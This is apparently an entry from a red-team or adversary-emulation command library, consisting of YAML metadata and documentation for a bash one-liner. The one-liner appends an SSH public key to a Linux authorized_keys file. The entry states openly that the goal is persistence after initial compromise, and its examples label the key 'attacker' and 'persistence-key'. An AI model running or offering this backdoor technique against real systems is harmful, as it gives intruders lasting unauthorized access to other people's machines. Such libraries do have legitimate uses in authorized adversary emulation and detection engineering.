---
id: 664e433a-65cf-43fe-8f56-7a7de090ca9d
name: add-public-key-to-authorized-keys
type: command
executor: bash
data: >-
  echo "ssh-rsa $_PUBLIC_KEY comment" >> $_AUTHORIZED_KEYS_PATH && chmod 600
  $_AUTHORIZED_KEYS_PATH
output: null
created_at: '2023-04-06T03:56:13.648141+00:00'
updated_at: '2023-04-10T20:20:48.492934+00:00'
platforms:
  - Linux
tags:
  - persistence
  - ssh
verified: true
validated: true
---

# add-public-key-to-authorized-keys

## Command

```bash
echo "ssh-rsa $_PUBLIC_KEY comment" >> $_AUTHORIZED_KEYS_PATH && chmod 600 $_AUTHORIZED_KEYS_PATH
```

## Description

This command appends an SSH public key to the authorized_keys file on a Linux system, enabling passwordless SSH access for the corresponding private key holder. It is used in persistence scenarios to maintain access after initial compromise. The chmod ensures the file has secure permissions to prevent unauthorized reading.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PUBLIC_KEY | The full public key string (e.g., ssh-rsa AAAAB3NzaC1yc2E...== attacker@host) | Yes |
| $_AUTHORIZED_KEYS_PATH | Full path to the authorized_keys file (e.g., /home/ubuntu/.ssh/authorized_keys) | Yes |
| comment | Optional identifier for the key (e.g., "attacker-key") | No |

## Examples

### Basic Usage

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... attacker" >> /home/ec2-user/.ssh/authorized_keys && chmod 600 /home/ec2-user/.ssh/authorized_keys
```

### Advanced Usage

For a specific user with error handling:

```bash
echo "ssh-rsa $_PUBLIC_KEY persistence-key" >> $_PATH && chmod 600 $_PATH || echo "Failed to append key"
```

## Expected Output

No direct output from the command itself (silent append). To verify success, run `tail -1 $_AUTHORIZED_KEYS_PATH` which should display the newly added key line. If the file didn't exist, it will be created. Errors may include "Permission denied" if lacking write access.

## Related

- [[procedures/aws-ssh-persistence-via-authorized-keys]]
